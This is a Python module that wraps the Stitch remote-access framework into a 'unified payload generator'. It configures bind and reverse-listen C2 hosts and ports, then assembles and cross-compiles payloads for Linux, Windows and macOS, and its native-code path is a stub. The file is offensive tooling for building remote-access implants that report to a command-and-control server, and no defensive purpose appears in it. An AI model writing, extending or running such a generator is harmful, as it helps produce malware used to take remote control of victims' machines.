#!/usr/bin/env python3
"""
Unified Payload Generator
Consolidates all payload generation into a single, clean system
"""

import os
import sys
import json
import shutil
import tempfile
import base64
import hashlib
import subprocess
import configparser as ConfigParser
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, Optional

# Add Application directory to path
sys.path.insert(0, os.path.dirname(__file__))

from Application.stitch_gen import assemble_stitch
from Application.stitch_pyld_config import stitch_ini, get_conf_dir, gen_default_st_config
from Application.stitch_cross_compile import compile_payload
from Application.Stitch_Vars.globals import configuration_path

class UnifiedPayloadGenerator:
    """Unified payload generation system that handles both Python and native payloads"""
    
    def __init__(self):
        self.base_path = Path("/workspace/payloads")
        self.output_path = self.base_path / "output"
        self.temp_path = self.base_path / "temp"
        
        # Ensure directories exist
        self.output_path.mkdir(parents=True, exist_ok=True)
        self.temp_path.mkdir(parents=True, exist_ok=True)
        
        # Supported platforms
        self.supported_platforms = ["linux", "windows", "macos"]
        self.supported_types = ["python", "native"]
    
    def generate_payload(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate a payload based on configuration
        
        Args:
            config: Configuration dictionary containing:
                - type: 'python' or 'native'
                - platform: 'linux', 'windows', or 'macos'
                - bind_host: C2 server host
                - bind_port: C2 server port
                - listen_host: Listen host (for reverse connections)
                - listen_port: Listen port (for reverse connections)
                - enable_bind: Enable bind mode
                - enable_listen: Enable listen mode
                - payload_name: Name for the payload
                - obfuscate: Whether to obfuscate the payload
        
        Returns:
            Dictionary with success status, payload info, and any errors
        """
        try:
            # Validate configuration
            validation_result = self._validate_config(config)
            if not validation_result['valid']:
                return {
                    'success': False,
                    'error': validation_result['error']
                }
            
            # Generate payload based on type
            if config['type'] == 'python':
                return self._generate_python_payload(config)
            elif config['type'] == 'native':
                return self._generate_native_payload(config)
            else:
                return {
                    'success': False,
                    'error': f"Unsupported payload type: {config['type']}"
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f"Payload generation failed: {str(e)}"
            }
    
    def _validate_config(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Validate configuration parameters"""
        required_fields = ['type', 'platform']
        
        for field in required_fields:
            if field not in config:
                return {
                    'valid': False,
                    'error': f"Missing required field: {field}"
                }
        
        if config['type'] not in self.supported_types:
            return {
                'valid': False,
                'error': f"Unsupported payload type: {config['type']}. Supported: {self.supported_types}"
            }
        
        if config['platform'] not in self.supported_platforms:
            return {
                'valid': False,
                'error': f"Unsupported platform: {config['platform']}. Supported: {self.supported_platforms}"
            }
        
        return {'valid': True}
    
    def _generate_python_payload(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Python payload using the legacy stitch_gen system"""
        try:
            # Set up configuration for stitch_gen
            stini = stitch_ini()
            
            # Configure bind/listen settings
            if config.get('enable_bind', True):
                stini.set_value("BIND", "True")
                stini.set_value("BHOST", config.get('bind_host', 'localhost'))
                stini.set_value("BPORT", config.get('bind_port', '4433'))
            else:
                stini.set_value("BIND", "False")
            
            if config.get('enable_listen', True):
                stini.set_value("LISTEN", "True")
                stini.set_value("LHOST", config.get('listen_host', 'localhost'))
                stini.set_value("LPORT", config.get('listen_port', '4455'))
            else:
                stini.set_value("LISTEN", "False")
            
            # Generate payload using legacy system
            assemble_stitch()
            
            # Get configuration directory
            conf_dir = get_conf_dir()
            
            # Compile payload based on platform
            payload_name = config.get('payload_name', 'stitch_payload')
            platform = config['platform']
            
            # Map platform names
            platform_map = {
                'windows': 'windows',
                'linux': 'linux', 
                'macos': 'macos'
            }
            target_platform = platform_map.get(platform, 'linux')
            
            # Compile the payload
            payload_path = compile_payload(
                source_dir=configuration_path,
                output_dir=conf_dir,
                platform=target_platform,
                payload_name=payload_name
            )
            
            if not payload_path or not os.path.exists(payload_path):
                return {
                    'success': False,
                    'error': 'Payload compilation failed'
                }
            
            payload_file = Path(payload_path)
            
            # Copy to output directory
            output_filename = f"{config.get('payload_name', 'stitch_payload')}_{config['platform']}.{payload_file.suffix[1:]}"
            output_path = self.output_path / output_filename
            shutil.copy2(payload_file, output_path)
            
            # Get file info
            file_size = output_path.stat().st_size
            file_hash = self._calculate_hash(output_path)
            
            return {
                'success': True,
                'payload_path': str(output_path),
                'filename': output_filename,
                'size': file_size,
                'hash': file_hash,
                'platform': config['platform'],
                'payload_type': 'python',
                'message': f'Python payload generated successfully'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Python payload generation failed: {str(e)}'
            }
    
    def _generate_native_payload(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate native C payload"""
        try:
            # For now, return a placeholder since native generation is complex
            # This would integrate with the native_payload_builder.py system
            return {
                'success': False,
                'error': 'Native payload generation not yet implemented in unified system'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Native payload generation failed: {str(e)}'
            }
    
    def _calculate_hash(self, file_path: Path) -> str:
        """Calculate SHA256 hash of a file"""
        hash_sha256 = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return hash_sha256.hexdigest()
    
    def get_supported_platforms(self) -> list:
        """Get list of supported platforms"""
        return self.supported_platforms.copy()
    
    def get_supported_types(self) -> list:
        """Get list of supported payload types"""
        return self.supported_types.copy()

# Global instance
unified_generator = UnifiedPayloadGenerator()

def generate_payload(config: Dict[str, Any]) -> Dict[str, Any]:
    """Convenience function for generating payloads"""
    return unified_generator.generate_payload(config)